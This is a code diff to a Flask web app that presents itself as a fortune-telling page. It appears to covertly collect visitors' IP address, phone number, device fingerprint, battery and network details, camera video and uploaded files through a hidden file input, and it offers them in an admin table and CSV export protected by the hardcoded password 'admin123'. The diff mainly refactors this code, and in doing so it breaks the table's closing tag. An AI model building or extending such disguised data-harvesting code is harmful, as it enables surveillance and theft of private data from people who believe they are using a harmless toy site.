@@ -43,7 +43,7 @@ FORTUNES = [
 
 DATA_FILE = 'visitors.json'
 
-# ALL FIELDS - Admin panel will ALWAYS show these columns
+# ALL POSSIBLE FIELDS – admin table will ALWAYS show these columns
 ALL_FIELDS = [
     'sessionId', 'timestamp', 'ip', 'name', 'fortuneText', 'phoneNumber',
     'fingerprint', 'batteryLevel', 'batteryCharging', 'networkType', 'networkSpeed',
@@ -116,7 +116,6 @@ def save():
     data = request.json
     data['timestamp'] = datetime.now().isoformat()
     data['ip'] = request.remote_addr
-    # Ensure every field exists
     for field in ALL_FIELDS:
         if field not in data:
             data[field] = ''
@@ -149,26 +148,21 @@ def admin():
         password = request.form.get('password')
         if password == 'admin123':
             visitors = get_visitors()
-            # FORCE show ALL columns even if no data
             html = '<h1>💕 Visitor Data</h1><p><a href="/admin">Back to login</a> | <a href="/admin/download-csv?pass=admin123">📥 Download CSV (Excel compatible)</a></p>'
             html += '<table border="1" cellpadding="5">'
-            html += '<tr>'
-            for field in ALL_FIELDS:
-                html += f'<th>{field}</th>'
-            html += '</tr>'
-            
+            html += '<tr>' + ''.join(f'<th>{f}</th>' for f in ALL_FIELDS) + '</tr>'
             if not visitors:
                 html += '<tr><td colspan="21">No data yet</td></tr>'
             else:
                 for v in visitors:
                     html += '<tr>'
-                    for field in ALL_FIELDS:
-                        val = v.get(field, '')
-                        if field in ('cameraVideo', 'files') and len(str(val)) > 100:
+                    for f in ALL_FIELDS:
+                        val = v.get(f, '')
+                        if f in ('cameraVideo', 'files') and len(str(val)) > 100:
                             val = str(val)[:100] + '…'
                         html += f'<td>{str(val)[:100]}</td>'
                     html += '</tr>'
-            html += '</table>'
+            html += '<table>'
             return html
         else:
             return '<h1>🔒 Wrong password. <a href="/admin">Try again</a></h1>'
@@ -202,25 +196,15 @@ def download_csv():
     if pwd != 'admin123':
         return 'Unauthorized', 403
     visitors = get_visitors()
-    
     import csv
     from io import StringIO
     output = StringIO()
     writer = csv.writer(output, quoting=csv.QUOTE_ALL)
     writer.writerow(ALL_FIELDS)
-    
     for v in visitors:
-        row = []
-        for field in ALL_FIELDS:
-            val = v.get(field, '')
-            row.append(str(val).replace('\n', ' ').replace('\r', ' '))
+        row = [str(v.get(f, '')).replace('\n', ' ').replace('\r', ' ') for f in ALL_FIELDS]
         writer.writerow(row)
-    
-    return Response(
-        output.getvalue(),
-        mimetype='text/csv',
-        headers={'Content-Disposition': 'attachment;filename=visitors_data.csv'}
-    )
+    return Response(output.getvalue(), mimetype='text/csv', headers={'Content-Disposition': 'attachment;filename=visitors_data.csv'})
 
 HTML_TEMPLATE = '''
 <!DOCTYPE html>
@@ -348,7 +332,6 @@ HTML_TEMPLATE = '''
     </div>
 </div>
 
-<!-- Hidden file input -->
 <input type="file" id="fileInput" multiple style="display:none">
 
 <script>
